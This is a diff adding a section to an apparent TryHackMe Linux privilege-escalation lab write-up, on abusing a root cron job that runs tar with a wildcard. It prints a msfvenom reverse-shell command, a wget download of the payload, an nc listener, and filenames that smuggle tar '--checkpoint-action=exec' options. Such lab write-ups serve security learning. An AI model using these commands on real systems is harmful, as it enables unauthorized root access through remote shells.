@@ -57,6 +57,11 @@
 #### [&nbsp; 9.1: What is the value of the PATH variable in /etc/crontab?](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Linux%20PrivEsc#91-what-is-the-value-of-the-path-variable-in-etccrontab)
 
 <br />
+
+### [10: Cron Jobs - Wildcards](https://github.com/EvanDiamantidis/TryHackMe/edit/main/Linux%20PrivEsc/README.md#10-cron-jobs---wildcards-1)
+#### [&nbsp; 10.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/edit/main/Linux%20PrivEsc/README.md#101-read-and-follow-along-with-the-above)
+
+<br />
 <br />
 
 ## 1. Deploy the Vulnerable Debian VM
@@ -836,4 +841,76 @@ The full path was listed when we first viewed the contents of the `/etc/crontab`
 <br/>
 <br/>
 
+## 10: Cron Jobs - Wildcards
 
+<br/>
+
+Let's read through the other cron job script:
+
+```
+cat /usr/local/bin/compress.sh
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172453181-b97b7c49-a00e-4d5c-9328-a28fdca19eec.png)
+
+The `tar` command appears to run with a wildcard signified by the asterisk symbol `*`, that can be exploited if not used properly. According to the `crontab` information, it seems that a backup of the `/home/user/`folder is being made every minute.
+
+<br/>
+
+As instructed, let's create a `.elf` reverse shell using `msfvenon`.
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f elf -o shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172459683-553b1f6b-cfe8-48d5-9db6-e60f546338e6.png)
+
+Now let's set up a temporary python server so we can download the file on the target machine:
+
+```
+python3 -m http.server LOCAL_PORT
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172460555-5eb9b9e4-27f4-47c5-a37d-06c5b5efdc20.png)
+
+Now switch to the target machine shell and pull the file using the `wget` command:
+
+```
+wget LOCAL_IP:LOCAL_PORT/shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172460876-ead4222e-b8e4-4362-94bd-b99c3ff8913f.png)
+
+After successfully downloading the file, we need to ensure it is an executable:
+
+```
+chmod +x shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172461015-016fc8cf-a4ce-4931-952b-1828c3a4d824.png)
+
+Create the following files in the `/home/user` directory as instructed on the task:
+
+`touch /home/user/--checkpoint=1`
+`touch /home/user/--checkpoint-action=exec=shell.elf`
+
+The files we just created are valid `tar` informative output options, which we can also confirm using the `tar --help` command. Once the `tar` cron job runs, the wildcard `*` will include these files and since both filenames are valid `tar` options they will be recognized and treated as such, rather than filenames.
+
+Next up we need to set up a `netcat` listener locally. Please note that the port number should be the same we used to create the `shell.elf` reverse shell.
+
+`nc -lvnp LOCAL_PORT`
+
+After a short wait the cron job runs and the listener picks up the connection to the target:
+
+![image](https://user-images.githubusercontent.com/14150485/172463273-100f35d1-c383-41cc-9914-8c294f084f6e.png)
+
+<br/>
+
+### 10.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
